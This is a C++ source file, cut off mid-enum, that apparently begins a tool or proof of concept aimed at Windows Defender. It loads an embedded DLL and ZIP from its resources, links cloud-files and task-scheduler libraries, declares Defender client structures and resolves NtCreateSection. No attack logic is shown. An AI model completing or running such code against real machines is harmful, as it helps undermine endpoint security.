// meh
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <conio.h>
#include <ntstatus.h>
#include <objbase.h>
#include <cfapi.h>
#include <AclAPI.h>
#include <initguid.h>
#include <ole2.h>
#include <taskschd.h>
#include <comdef.h>
#include "resource.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "CldApi.lib")
#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "taskschd.lib")


#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE

wchar_t scan_target[MAX_PATH] = { 0 };

HRSRC hResInfo_zip = FindResource(NULL, MAKEINTRESOURCE(IDR_ZIP1), L"zip");
HGLOBAL hResData_zip = LoadResource(NULL, hResInfo_zip);
LPVOID pResourceData_zip = LockResource(hResData_zip);
DWORD dwSize_zip = SizeofResource(NULL, hResInfo_zip);


HRSRC hResInfo_dll = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"dll");
HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
LPVOID pResourceData_dll = LockResource(hResData_dll);
DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);

#define MP_THREAT_STAT_MAX_VALUE 1000
#define MP_MAX_SUGGESTIONS 10000
typedef HANDLE MPHANDLE;
typedef HANDLE* PMPHANDLE;
typedef ULONG MPTHREAT_ID;
typedef ULONG MPRESOURCE_CLASS;
typedef ULONG MP_EXPIRE_REASON;
typedef ULONG MP_EXPIRE_STATE_REPORT;
typedef LPWSTR MP_MIDL_STRING;
typedef struct tagMPCALLBACK_INFO {
	void* CallbackHandler;
	__int64 v4;
} MPCALLBACK_INFO, * PMPCALLBACK_INFO;



typedef enum tagMPTHREAT_TYPE {
	MPTHREAT_TYPE_KNOWNBAD = 0,
	MPTHREAT_TYPE_BEHAVIOR = 1,
	MPTHREAT_TYPE_UNKNOWN = 2,
	MPTHREAT_TYPE_KNOWNGOOD = 3,
	MPTHREAT_TYPE_NIS = 4,
	MPTHREAT_TYPE_MAXVALUE = 4
} MPTHREAT_TYPE, * PMPTHREAT_TYPE;

typedef enum tagMPTHREAT_SOURCE {
	MPTHREAT_SOURCE_SCAN = 0,
	MPTHREAT_SOURCE_ACTIVE = 1,
	MPTHREAT_SOURCE_HISTORY = 2,
	MPTHREAT_SOURCE_QUARANTINE = 3,
	MPTHREAT_SOURCE_SIGNATURE = 4,
	MPTHREAT_SOURCE_STATE = 5,
	MPTHREAT_SOURCE_MAXVALUE = 5
} MPTHREAT_SOURCE, * PMPTHREAT_SOURCE;
typedef enum tagMPSCAN_TYPE {
	MPSCAN_TYPE_UNKNOWN = 0,
	MPSCAN_TYPE_QUICK = 1,
	MPSCAN_TYPE_FULL = 2,
	MPSCAN_TYPE_RESOURCE = 3,
	MPSCAN_TYPE_MAXVALUE = 3
} MPSCAN_TYPE, * PMPSCAN_TYPE;
typedef enum tagMPSOURCE {
	MPSOURCE_UNKNOWN = 0,
	MPSOURCE_USER = 1,
	MPSOURCE_SYSTEM = 2,
	MPSOURCE_REALTIME = 3,
	MPSOURCE_IOAV = 4,
	MPSOURCE_NIS = 5,
	MPSOURCE_BHO = 6,
	MPSOURCE_IEPROTECT = 6,
	MPSOURCE_ELAM = 7,
	MPSOURCE_LOCAL_ATTESTATION = 8,
	MPSOURCE_REMOTE_ATTESTATION = 9,
	MPSOURCE_AMSI = 10,
	MP_SOURCE_MAXVALUE = 10
} MPSOURCE, * PMPSOURCE;


typedef enum tagMPTHREAT_SEVERITY {
	MP_THREAT_SEVERITY_UNKNOWN = 0,
	MP_THREAT_SEVERITY_LOW = 1,
	MP_THREAT_SEVERITY_MODERATE = 2,
	MP_THREAT_SEVERITY_HIGH = 4,
	MP_THREAT_SEVERITY_SEVERE = 5,
	MP_THREAT_SEVERITY_MAXVALUE = 5
} MPTHREAT_SEVERITY, * PMPTHREAT_SEVERITY;

typedef struct tagMPTHREAT_STATS_DATA {
	DWORD dwThreatCount;
} MPTHREAT_STATS_DATA, * PMPTHREAT_STATS_DATA;

typedef struct tagMPCOMPONENT_STATUS {
	BOOL    fEnable;
	HRESULT hResult;
} MPCOMPONENT_STATUS, * PMPCOMPONENT_STATUS;

typedef struct tagMPTHREAT_STATS {
	UINT ThreatCount;
	UINT SuspiciousThreatCount;
	UINT Reserved[4];
} MPTHREAT_STATS, * PMPTHREAT_STATS;

typedef enum tagMPTHREAT_CATEGORY {
	MP_THREAT_CATEGORY_INVALID = 0,
	MP_THREAT_CATEGORY_ADWARE = 1,
	MP_THREAT_CATEGORY_SPYWARE = 2,
	MP_THREAT_CATEGORY_PASSWORDSTEALER = 3,
	MP_THREAT_CATEGORY_TROJANDOWNLOADER = 4,
	MP_THREAT_CATEGORY_WORM = 5,
	MP_THREAT_CATEGORY_BACKDOOR = 6,
	MP_THREAT_CATEGORY_REMOTEACCESSTROJAN = 7,
	MP_THREAT_CATEGORY_TROJAN = 8,
	MP_THREAT_CATEGORY_EMAILFLOODER = 9,
	MP_THREAT_CATEGORY_KEYLOGGER = 10,
	MP_THREAT_CATEGORY_DIALER = 11,
	MP_THREAT_CATEGORY_MONITORINGSOFTWARE = 12,
	MP_THREAT_CATEGORY_BROWSERMODIFIER = 13,
	MP_THREAT_CATEGORY_COOKIE = 14,
	MP_THREAT_CATEGORY_BROWSERPLUGIN = 15,
	MP_THREAT_CATEGORY_AOLEXPLOIT = 16,
	MP_THREAT_CATEGORY_NUKER = 17,
	MP_THREAT_CATEGORY_SECURITYDISABLER = 18,
	MP_THREAT_CATEGORY_JOKEPROGRAM = 19,
	MP_THREAT_CATEGORY_HOSTILEACTIVEXCONTROL = 20,
	MP_THREAT_CATEGORY_SOFTWAREBUNDLER = 21,
	MP_THREAT_CATEGORY_STEALTHNOTIFIER = 22,
	MP_THREAT_CATEGORY_SETTINGSMODIFIER = 23,
	MP_THREAT_CATEGORY_TOOLBAR = 24,
	MP_THREAT_CATEGORY_REMOTECONTROLSOFTWARE = 25,
	MP_THREAT_CATEGORY_TROJANFTP = 26,
	MP_THREAT_CATEGORY_POTENTIALUNWANTEDSOFTWARE = 27,
	MP_THREAT_CATEGORY_ICQEXPLOIT = 28,
	MP_THREAT_CATEGORY_TROJANTELNET = 29,
	MP_THREAT_CATEGORY_EXPLOIT = 30,
	MP_THREAT_CATEGORY_FILESHARINGPROGRAM = 31,
	MP_THREAT_CATEGORY_MALWARE_CREATION_TOOL = 32,
	MP_THREAT_CATEGORY_REMOTE_CONTROL_SOFTWARE = 33,
	MP_THREAT_CATEGORY_TOOL = 34,
	MP_THREAT_CATEGORY_TROJAN_DENIALOFSERVICE = 36,
	MP_THREAT_CATEGORY_TROJAN_DROPPER = 37,
	MP_THREAT_CATEGORY_TROJAN_MASSMAILER = 38,
	MP_THREAT_CATEGORY_TROJAN_MONITORINGSOFTWARE = 39,
	MP_THREAT_CATEGORY_TROJAN_PROXYSERVER = 40,
	MP_THREAT_CATEGORY_VIRUS = 42,
	MP_THREAT_CATEGORY_KNOWN = 43,
	MP_THREAT_CATEGORY_UNKNOWN = 44,
	MP_THREAT_CATEGORY_SPP = 45,
	MP_THREAT_CATEGORY_BEHAVIOR = 46,
	MP_THREAT_CATEGORY_VULNERABILTIY = 47,
	MP_THREAT_CATEGORY_POLICY = 48
} MPTHREAT_CATEGORY, * PMPTHREAT_CATEGORY;

typedef enum tagMPTHREAT_STATUS {
	MP_THREAT_STATUS_UNKNOWN = 0,
	MP_THREAT_STATUS_DETECTED = 1,
	MP_THREAT_STATUS_CLEANED = 2,
	MP_THREAT_STATUS_QUARANTINED = 3,
	MP_THREAT_STATUS_REMOVED = 4,
	MP_THREAT_STATUS_ALLOWED = 5,
	MP_THREAT_STATUS_BLOCKED = 6,
	MP_THREAT_STATUS_CLEAN_FAILED = 102,
	MP_THREAT_STATUS_QUARANTINE_FAILED = 103,
	MP_THREAT_STATUS_REMOVE_FAILED = 104,
	MP_THREAT_STATUS_ALLOW_FAILED = 105,
	MP_THREAT_STATUS_ABANDONED = 106,
	MP_THREAT_STATUS_BLOCK_FAILED = 107
} MPTHREAT_STATUS, * PMPTHREAT_STATUS;

typedef enum tagMPTHREAT_DETECTION {
	MP_THREAT_DETECTION_CONCRETE = 0,
	MP_THREAT_DETECTION_HEURISTIC = 1,
	MP_THREAT_DETECTION_GENERIC = 2,
	MP_THREAT_DETECTION_SUSPICIOUS = 4,
	MP_THREAT_DETECTION_FASTPATH = 8
} MPTHREAT_DETECTION, * PMPTHREAT_DETECTION;

typedef struct tagMPRESOURCE_STATS {
	DWORD  PPMProgress;
	UINT64 ProcessCount;
	UINT64 FileCount;
	UINT64 FileBytesCount;
	UINT64 RegKeyCount;
	UINT64 Reserved[4];
} MPRESOURCE_STATS, * PMPRESOURCE_STATS;

typedef struct tagMPSCAN_RESULT {
	MPSCAN_TYPE      ScanType;
	MPSOURCE         Source;
	GUID             ScanGuid;
	ULARGE_INTEGER   StartTime;
	ULARGE_INTEGER   EndTime;
	MPTHREAT_STATS   ThreatStats;
	MPRESOURCE_STATS ResourceStats;
	ULONGLONG        SignatureVersion;
} MPSCAN_RESULT, * PMPSCAN_RESULT;

typedef enum tagMPTHREAT_ACTION {
	MP_THREAT_ACTION_UNKNOWN = 0,
	MP_THREAT_ACTION_CLEAN = 1,
	MP_THREAT_ACTION_QUARANTINE = 2,
	MP_THREAT_ACTION_REMOVE = 3,
	MP_THREAT_ACTION_ALLOW = 6,
	MP_THREAT_ACTION_USERDEFINED = 8,
	MP_THREAT_ACTION_NOACTION = 9,
	MP_THREAT_ACTION_BLOCK = 10,
	MP_THREAT_ACTION_MAX_VALUE = 10
} MPTHREAT_ACTION, * PMPTHREAT_ACTION;

typedef enum tagMPEXECUTION_STATUS {
	MP_EXECUTION_STATUS_UNKNOWN = 0,
	MP_EXECUTION_STATUS_BLOCKED = 1,
	MP_EXECUTION_STATUS_ALLOWED = 2,
	MP_EXECUTION_STATUS_EXECUTING = 3,
	MP_EXECUTION_STATUS_NOT_EXECUTING = 4
} MPEXECUTION_STATUS, * PMPEXECUTION_STATUS;

typedef struct tagMPTHREAT_INFOEX_UNUSED {
	DWORD dwNone;
} MPTHREAT_INFOEX_UNUSED, * PMPTHREAT_INFOEX_UNUSED;


typedef enum tagMP_HASH_TYPE {
	MP_HASH_TYPE_NONE = 0,
	MP_HASH_TYPE_CRC32 = 2,
	MP_HASH_TYPE_MD5 = 4,
	MP_HASH_TYPE_SHA1 = 8,
	MP_HASH_TYPE_SHA256 = 16
} MP_HASH_TYPE, * PMP_HASH_TYPE;

typedef enum tagMPDETECTION_STATE {
	MPDETECTION_STATE_UNKNOWN = 0,
	MPDETECTION_STATE_ACTIVE = 1,
	MPDETECTION_STATE_FINISHED = 2,
	MPDETECTION_STATE_ADDITIONAL_ACTIONS = 3,
	MPDETECTION_STATE_FAILED = 4,
	MPDETECTION_STATE_CRITICALLY_FAILED = 5,
	MPDETECTION_STATE_CLEARED = 6
} MPDETECTION_STATE, * PMPDETECTION_STATE;

typedef enum tagMPDETECTION_ORIGIN {
	MPDETECTION_ORIGIN_UNKNOWN = 0,
	MPDETECTION_ORIGIN_LOCAL_MACHINE = 1 << 0,
	MPDETECTION_ORIGIN_NETWORKSHARE = 1 << 1,
	MPDETECTION_ORIGIN_INTERNET = 1 << 2,
	MPDETECTION_ORIGIN_OUTBOUND = 1 << 3,
	MPDETECTION_ORIGIN_INBOUND = 1 << 4
} MPDETECTION_ORIGIN, * PMPDETECTION_ORIGIN;

typedef enum tagMPRESOLVED_REASON {
	MPRESOLVED_REASON_UNKNOWN = 0,
	MPRESOLVED_REASON_FULL_SCAN = 1,
	MPRESOLVED_REASON_TIMED_OUT = 2
} MPRESOLVED_REASON, * PMPRESOLVED_REASON;

typedef enum tagMPCOMPONENT_ID {
	MPCOMPONENT_AS_SIGNATURE = 0,
	MPCOMPONENT_AV_SIGNATURE = 1,
	MPCOMPONENT_REALTIME_MONITOR = 2,
	MPCOMPONENT_ONACCESS_PROTECTION = 3,
	MPCOMPONENT_IOAV_PROTECTION = 4,
	MPCOMPONENT_BEHAVIOR_MONITOR = 5,
	MPCOMPONENT_AUTO_SCAN = 6,
	MPCOMPONENT_AUTO_SIGUPDATE = 7,
	MPCOMPONENT_IPC = 8,
	MPCOMPONENT_NIS = 9,
	MPCOMPONENT_ELAM = 10,
	MPCOMPONENT_MAXVALUE = 10
} MPCOMPONENT_ID, * PMPCOMPONENT_ID;


typedef enum tagMPNOTIFY {
	MPNOTIFY_NONE = 0,
	MPNOTIFY_CALL_START = 0x1001,
	MPNOTIFY_CALL_COMPLETE = 0x1002,
	MPNOTIFY_INTERNAL_FAILURE = 0x2001,
	MPNOTIFY_STATUS_SERVICE_START = 0x3001,
	MPNOTIFY_STATUS_SERVICE_RUNNING = 0x3002,
	MPNOTIFY_STATUS_SERVICE_STOP = 0x3003,
	MPNOTIFY_STATUS_COMPONENT = 0x3004,
	MPNOTIFY_STATUS_CHANGE = 0x3005,
	MPNOTIFY_STATUS_COMPONENT_CONFIGURATION = 0x3006,
	MPNOTIFY_STATUS_EXPIRATION_CHANGE = 0x3007,
	MPNOTIFY_STATUS_OFFLINE_SCAN_CHANGE = 0x3008,
	MPNOTIFY_SCAN_START = 0x4001,
	MPNOTIFY_SCAN_PAUSED = 0x4002,
	MPNOTIFY_SCAN_RESUMED = 0x4003,
	MPNOTIFY_SCAN_CANCEL = 0x4004,
	MPNOTIFY_SCAN_COMPLETE = 0x4005,
	MPNOTIFY_SCAN_PROGRESS = 0x4006,
	MPNOTIFY_SCAN_ERROR = 0x4007,
	MPNOTIFY_SCAN_INFECTED = 0x4008,
	MPNOTIFY_SCAN_MEMORYSTART = 0x4009,
	MPNOTIFY_SCAN_MEMORYCOMPLETE = 0x4010,
	MPNOTIFY_SCAN_SFC_BUILD_START = 0x4011,
	MPNOTIFY_SCAN_SFC_BUILD_COMPLETE = 0x4012,
	MPNOTIFY_SCAN_FASTPATH_START = 0x4013,
	MPNOTIFY_SCAN_FASTPATH_COMPLETE = 0x4014,
	MPNOTIFY_SCAN_FASTPATH_PROGRESS = 0x4015,
	MPNOTIFY_CLEAN_START,
	MPNOTIFY_CLEAN_COMPLETE,
	MPNOTIFY_CLEAN_RESTOREPOINT_START,
	MPNOTIFY_CLEAN_RESTOREPOINT_SUCCEEDED,
	MPNOTIFY_CLEAN_RESTOREPOINT_FAILED,
	MPNOTIFY_CLEAN_THREAT_START,
	MPNOTIFY_CLEAN_THREAT_SUCCEEDED,
	MPNOTIFY_CLEAN_THREAT_FAILED,
	MPNOTIFY_CLEAN_RESOURCE_SUCCEEDED,
	MPNOTIFY_CLEAN_RESOURCE_FAILED,
	MPNOTIFY_CLEAN_THREAT_COMPLETE,
	MPNOTIFY_PRECHECK_START,
	MPNOTIFY_PRECHECK_COMPLETE,
	MPNOTIFY_PRECHECK_RESOURCE_BLOCKED,
	MPNOTIFY_THREAT_DETECTED,
	MPNOTIFY_THREAT_MODIFIED,
	MPNOTIFY_THREAT_CLEAN_SUCCEEDED,
	MPNOTIFY_THREAT_CLEAN_FAILED,
	MPNOTIFY_THREAT_ABANDONED,
	MPNOTIFY_THREAT_CLEAN_EVENT_START,
	MPNOTIFY_THREAT_CLEAN_EVENT_COMPLETE,
	MPNOTIFY_SIGUPDATE_START,
	MPNOTIFY_SIGUPDATE_SEARCH_START,
	MPNOTIFY_SIGUPDATE_SEARCH_COMPLETE,
	MPNOTIFY_SIGUPDATE_SOFTWARE_UPDATE_AVAILABLE,
	MPNOTIFY_SIGUPDATE_DOWNLOAD_START,
	MPNOTIFY_SIGUPDATE_DOWNLOAD_PROGRESS,
	MPNOTIFY_SIGUPDATE_DOWNLOAD_COMPLETE,
	MPNOTIFY_SIGUPDATE_INSTALL_START,
	MPNOTIFY_SIGUPDATE_INSTALL_PROGRESS,
	MPNOTIFY_SIGUPDATE_INSTALL_COMPLETE,
	MPNOTIFY_SIGUPDATE_REBOOT_REQUIRED,
	MPNOTIFY_SIGUPDATE_REQUEST_PROCESSED,
	MPNOTIFY_SIGUPDATE_COMPLETE,
	MPNOTIFY_SAMPLE_START,
	MPNOTIFY_SAMPLE_COMPLETE,
	MPNOTIFY_SAMPLE_ITEM_START,
	MPNOTIFY_SAMPLE_ITEM_SUCCEEDED,
	MPNOTIFY_SAMPLE_ITEM_FAILED,
	MPNOTIFY_RESERVED_DATA,
	MPNOTIFY_FASTPATH_SIG_ADDED,
	MPNOTIFY_FASTPATH_SIG_REMOVED,
	MPNOTIFY_NIS_PRIVATE,
	MPNOTIFY_HEALTH_CHANGE,
	MPNOTIFY_HEALTH_RECOVERY,
	MPNOTIFY_HEALTH_START,
	MPNOTIFY_ENDOFLIFE_CHANGE,
	MPNOTIFY_MALWARETOAST_DATA
} MPNOTIFY, * PMPNOTIFY;

typedef enum tagMPSIGUPDATE_TYPE {
	MPSIGUPDATE_TYPE_NONE,
	MPSIGUPDATE_TYPE_MANAGED,
	MPSIGUPDATE_TYPE_HTTP,
	MPSIGUPDATE_TYPE_HTTP_SRV,
	MPSIGUPDATE_TYPE_UNC,
	MPSIGUPDATE_TYPE_UNMANAGED,
	MPSIGUPDATE_TYPE_MANAGED_PLATFORM,
	MPSIGUPDATE_TYPE_UNMANAGED_PLATFORM
} MPSIGUPDATE_TYPE, * PMPSIGUPDATE_TYPE;


typedef enum tagMP_UPDATE_STAGE {
	MP_STAGE_UNKNOWN,
	MP_SEARCH_UPDATE,
	MP_DOWNLOAD_UPDATE,
	MP_INSTALL_UPDATE
} MP_UPDATE_STAGE, * PMP_UPDATE_STAGE;

typedef enum tagMP_SIGNATURE_TYPE {
	MP_SIGNATURE_ANTIMALWARE = 0,
	MP_SIGNATURE_ANTIVIRUS = 1,
	MP_SIGNATURE_ANTISPYWARE = 2,
	MP_SIGNATURE_NIS = 3,
	MP_SIGNATURE_TYPES_MAXVALUE = 3
} MP_SIGNATURE_TYPE, * PMP_SIGNATURE_TYPE;

typedef enum tagMP_FASTPATH_TYPE {
	MP_FASTPATH_UNKNOWN = 0,
	MP_FASTPATH_VDM = 1,
	MP_FASTPATH_DISABLED = 2
} MP_FASTPATH_TYPE, * PMP_FASTPATH_TYPE;


typedef enum tagMP_PERSISTENCE_LIMIT_TYPE {
	MP_PERSISTENCE_UNKNOWN = 0,
	MP_PERSISTENCE_NO_LIMIT = 1,
	MP_PERSISTENCE_DURATION = 2,
	MP_PERSISTENCE_VDM_VERSION = 3,
	MP_PERSISTENCE_TIMESTAMP = 4,
	MP_PERSISTENCE_FORCED = 5
} MP_PERSISTENCE_LIMIT_TYPE, * PMP_PERSISTENCE_LIMIT_TYPE;

typedef enum tagMP_REMOVAL_REASON {
	MP_REMOVAL_UNKNOWN = 0,
	MP_REMOVAL_MANUAL = 1,
	MP_REMOVAL_AUTOMATIC = 2
} MP_REMOVAL_REASON, * PMP_REMOVAL_REASON;

typedef enum tagMPCALLBACK_TYPE {
	MPCALLBACK_UNKNOWN = 0,
	MPCALLBACK_STATUS = 1,
	MPCALLBACK_THREAT = 2,
	MPCALLBACK_SCAN = 3,
	MPCALLBACK_CLEAN = 4,
	MPCALLBACK_PRECHECK = 5,
	MPCALLBACK_SIGUPDATE = 6,
	MPCALLBACK_SAMPLE = 7,
	MPCALLBACK_RESERVED = 8,
	MPCALLBACK_CONFIGURATION_NOTIFICATION = 9,
	MPCALLBACK_FASTPATH = 10,
	MPCALLBACK_PRODUCT_EXPIRATION = 11,
	MPCALLBACK_NIS_PRIVATE = 12,
	MPCALLBACK_HEALTH = 13,
	MPCALLBACK_ENDOFLIFE = 14,
	MPCALLBACK_MALWARETOAST = 15,
	MPCALLBACK_MAXVALUE = 15
} MPCALLBACK_TYPE, * PMPCALLBACK_TYPE;



typedef struct tagMPTHREAT_INFOEX_BEHAVIOR {
	ULARGE_INTEGER         SignatureID;
	ULONGLONG              EngineVersion;
	ULONGLONG              ASDeltaSignatureVersion;
	ULONGLONG              AVDeltaSignatureVersion;
	MP_HASH_TYPE           HashType;
	DWORD                  FidelityValue;
	MP_MIDL_STRING         HashValue;
	MP_MIDL_STRING         TargetFileName;
	MP_MIDL_STRING         TargetFileHash;
} MPTHREAT_INFOEX_BEHAVIOR, * PMPTHREAT_INFOEX_BEHAVIOR;

typedef struct tagMPTHREAT_INFOEX_NIS {
	MP_MIDL_STRING        SourceIP;
	MP_MIDL_STRING        DestinationIP;
	DWORD                 dwSourceport;
	DWORD                 dwDestinationport;
	MP_MIDL_STRING        Protocol;
	MP_MIDL_STRING        Link;
} MPTHREAT_INFOEX_NIS, * PMPTHREAT_INFOEX_NIS;

typedef struct tagMPSTATUS_INFO {
	DWORD               ProductStatus;
	MPSCAN_RESULT       LastQuickScan;
	MPSCAN_RESULT       LastFullScan;
	MPTHREAT_STATS      ThreatStats;
	MPTHREAT_STATS_DATA ThreatState[MP_THREAT_STAT_MAX_VALUE + 1];
	MPCOMPONENT_STATUS  Component[MPCOMPONENT_MAXVALUE + 1];
	ULARGE_INTEGER      ProductExpirationTime;
} MPSTATUS_INFO, * PMPSTATUS_INFO;

typedef struct tagMPSTATUS_DATAEX_UNUSED {
	DWORD dwNone;
} MPSTATUS_DATAEX_UNUSED, * PMPSTATUS_DATAEX_UNUSED;

typedef struct tagMPSTATUS_DATA {
	MPCOMPONENT_ID ComponentID;
	BOOL           fEnable;
	union {
		PMPSTATUS_DATAEX_UNUSED p1;
		PMPSTATUS_DATAEX_UNUSED p2;
		PMPSTATUS_DATAEX_UNUSED p3;
		PMPSTATUS_DATAEX_UNUSED p4;
		PMPSTATUS_DATAEX_UNUSED p5;
		PMPSTATUS_DATAEX_UNUSED p6;
		PMPSTATUS_DATAEX_UNUSED p7;
		PMPSTATUS_DATAEX_UNUSED p8;
		PMPSTATUS_DATAEX_UNUSED p9;
		PMPSTATUS_DATAEX_UNUSED pa;
		PMPSTATUS_DATAEX_UNUSED pb;
	} ComponentStatus;
} MPSTATUS_DATA, * PMPSTATUS_DATA;

typedef struct tagMPRESOURCE_INFO {
	MP_MIDL_STRING        Scheme;
	MP_MIDL_STRING        Path;
	MPRESOURCE_CLASS      Class;
} MPRESOURCE_INFO, * PMPRESOURCE_INFO;

typedef struct tagMPSCAN_DATA {
	MPSCAN_TYPE      ScanType;
	PMPRESOURCE_INFO ResourceInfo;
	MPRESOURCE_STATS ResourceStats;
	MPTHREAT_STATS   ThreatStats;
} MPSCAN_DATA, * PMPSCAN_DATA;

typedef struct tagMPCLEAN_DATA {
	MPTHREAT_ID      ThreatID;
	MPTHREAT_ACTION  ThreatAction;
	DWORD            dwStatus;
	PMPRESOURCE_INFO ResourceInfo;
} MPCLEAN_DATA, * PMPCLEAN_DATA;

typedef struct tagMPCLEAN_PRECHECK_DATA {
	PMPRESOURCE_INFO     BlockedResourceInfo;
	PMPRESOURCE_INFO     BlockingResourceInfo;
} MPCLEAN_PRECHECK_DATA, * PMPCLEAN_PRECHECK_DATA;

typedef struct tagMPTHREAT_DATA {
	MPTHREAT_ID     ThreatID;
	DWORD           dwSessionID;
	MPTHREAT_ACTION ThreatAction;
	DWORD           dwStatus;
} MPTHREAT_DATA, * PMPTHREAT_DATA;

typedef struct tagMPSIGUPDATE_DATA {
	DWORD                 dwPercentComplete;
	DWORD                 dwTotalUpdates;
	DWORD                 dwCurrentUpdateIndex;
	MPSIGUPDATE_TYPE      eType;
	MP_UPDATE_STAGE       Stage;
	MP_MIDL_STRING        Path;
} MPSIGUPDATE_DATA, * PMPSIGUPDATE_DATA;

typedef struct tagMPSAMPLE_DATA {
	DWORD dwSampleIndex;
} MPSAMPLE_DATA, * PMPSAMPLE_DATA;

typedef struct tagMPRESERVED_DATA {
	DWORD cbReservedData;
	BYTE* pbReservedData;
} MPRESERVED_DATA, * PMPRESERVED_DATA;

typedef struct tagMPCONFIGURATION_DATA {
	MP_MIDL_STRING        ConfigurationName;
	DWORD                 DataType;
	DWORD                 PreviousDataSize;
	BYTE* pPreviousData;
	DWORD                 CurrentDataSize;
	BYTE* pCurrentData;
} MPCONFIGURATION_DATA, * PMPCONFIGURATION_DATA;

typedef struct tagMPFASTPATH_DATA {
	MP_SIGNATURE_TYPE         SignatureType;
	MP_FASTPATH_TYPE          FastPathSignatureType;
	MP_MIDL_STRING            FastPathSignatureVersion;
	ULARGE_INTEGER            CompilationTimestamp;
	MP_PERSISTENCE_LIMIT_TYPE PersistenceType;
	MP_MIDL_STRING            PersistenceValue;
	MP_MIDL_STRING            PersistencePath;
	MP_REMOVAL_REASON         Reason;
} MPFASTPATH_DATA, * PMPFASTPATH_DATA;

typedef struct tagMPEXPIRATION_DATA {
	MP_EXPIRE_REASON       Reason;
	MP_EXPIRE_STATE_REPORT State;
} MPEXPIRATION_DATA, * PMPEXPIRATION_DATA;

typedef struct tagMPNIS_PRIVATE_DATA {
	DWORD dwNotificationType;
	DWORD cbDataSize;
	BYTE* pbData;
} MPNIS_PRIVATE_DATA, * PMPNIS_PRIVATE_DATA;

typedef struct tagMPHEALTH_DATA {
	DWORD dwNotificationType;
	DWORD dwNotificationFlag;
} MPHEALTH_DATA, * PMPHEALTH_DATA;

typedef struct tagMPENDOFLIFE_DATA {
	FILETIME ftSignatureExpiry;
	FILETIME ftPlatformExpiry;
	BOOL     fAdminControlled;
	BOOL     fEndOfLifeImpendingOrPast;
} MPENDOFLIFE_DATA, * PMPENDOFLIFE_DATA;

typedef struct tagMPMALWARETOAST_DATA {
	DWORD                 dwThreatId;
	MP_MIDL_STRING        pszThreatName;
} MPMALWARETOAST_DATA, * PMPMALWARETOAST_DATA;

typedef struct tagMPCALLBACK_DATA {
	MPNOTIFY        Notify;
	HRESULT         hResult;
	ULARGE_INTEGER  TimeStamp;
	MPCALLBACK_TYPE Type;
	union {
		PMPSTATUS_DATA         pStatusData;
		PMPSCAN_DATA           pScanData;
		PMPCLEAN_DATA          pCleanData;
		PMPCLEAN_PRECHECK_DATA pPrecheckData;
		PMPTHREAT_DATA         pThreatData;
		PMPSIGUPDATE_DATA      pSigUpdateData;
		PMPSAMPLE_DATA         pSampleData;
		PMPRESERVED_DATA       pReservedData;
		PMPCONFIGURATION_DATA  pConfigurationData;
		PMPFASTPATH_DATA       pFastPathData;
		PMPEXPIRATION_DATA     pExpirationData;
		PMPNIS_PRIVATE_DATA    pNISPrivateData;
		PMPHEALTH_DATA         pHealthData;
		PMPENDOFLIFE_DATA      pEndOfLifeData;
		PMPMALWARETOAST_DATA   pMalwareToastData;
	} Data;
} MPCALLBACK_DATA, * PMPCALLBACK_DATA;

typedef struct tagMPTHREAT_INFO {
	MPTHREAT_ID           ThreatID;
	GUID                  DetectionID;
	MP_MIDL_STRING        Name;
	MPTHREAT_TYPE         ThreatType;
	MPTHREAT_SEVERITY     ThreatCriticality;
	MPTHREAT_CATEGORY     ThreatCategory;
	DWORD                 ThreatShortDescriptionID;
	DWORD                 ThreatAdviseDescriptionID;
	MPTHREAT_STATUS       ThreatStatus;
	DWORD                 SuggestedActionCount;
	MPTHREAT_ACTION       SuggestedActionArray[MP_MAX_SUGGESTIONS];
	DWORD                 ResourceCount;
	PMPRESOURCE_INFO* ResourceList[1024]; // old: ResourceList[ResourceCount];
	ULARGE_INTEGER        ThreatStatusTime;
	HRESULT               ThreatStatusCode;
	MPTHREAT_DETECTION    ThreatDetection;
	GUID                  QuarantineGuid;
	MPEXECUTION_STATUS    ExecutionStatus;
	union {
		PMPTHREAT_INFOEX_UNUSED   pKnownBad;
		PMPTHREAT_INFOEX_BEHAVIOR pBehavior;
		PMPTHREAT_INFOEX_UNUSED   pUnknown;
		PMPTHREAT_INFOEX_UNUSED   pKnownGood;
		PMPTHREAT_INFOEX_NIS      pNis;
	} Data;
	MPDETECTION_STATE     State;
	MP_MIDL_STRING        DetectionUser;
	MPSOURCE              DetectionSource;
	MP_MIDL_STRING        ProcessName;
	MPDETECTION_ORIGIN    DetectionOrigin;
	DWORD                 reserved1;
	ULARGE_INTEGER        DetectionTime;
	MPEXECUTION_STATUS    PreExecutionStatus;
	ULARGE_INTEGER        RemediationTime;
	MPEXECUTION_STATUS    PostExecutionStatus;
	BOOL                  CriticalFailure;
	DWORD                 NonCriticalReason;
	MP_MIDL_STRING        RemediationUser;
	DWORD                 RemediationResourceCount;
	PMPRESOURCE_INFO      RemediationResourceList[1024]; // old: RemediationResourceList[RemediationResourceCount]
	BOOL                  FailureResolved;
	MPRESOLVED_REASON     ResolvedReason;
	DWORD                 AdditionalActions;
	DWORD                 ResolvedActions;
	DWORD                 dwThreatStatusFlag;
} MPTHREAT_INFO, * PMPTHREAT_INFO;

typedef struct tagMPSCAN_RESOURCES {
	DWORD            dwResourceCount;
	PMPRESOURCE_INFO pResourceList;
} MPSCAN_RESOURCES, * PMPSCAN_RESOURCES;



HMODULE ntdllhm = GetModuleHandle(L"ntdll.dll");

NTSTATUS(WINAPI* _NtCreateSection)(
	OUT PHANDLE             SectionHandle,
	IN ULONG                DesiredAccess,
	IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER       MaximumSize OPTIONAL,
	IN ULONG                PageAttributess,
	IN ULONG                SectionAttributes,
	IN HANDLE               FileHandle OPTIONAL) = (NTSTATUS(WINAPI*)(
		OUT PHANDLE             SectionHandle,
		IN ULONG                DesiredAccess,
		IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
		IN PLARGE_INTEGER       MaximumSize OPTIONAL,
		IN ULONG                PageAttributess,
		IN ULONG                SectionAttributes,
		IN HANDLE               FileHandle OPTIONAL))GetProcAddress(ntdllhm, "NtCreateSection");

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
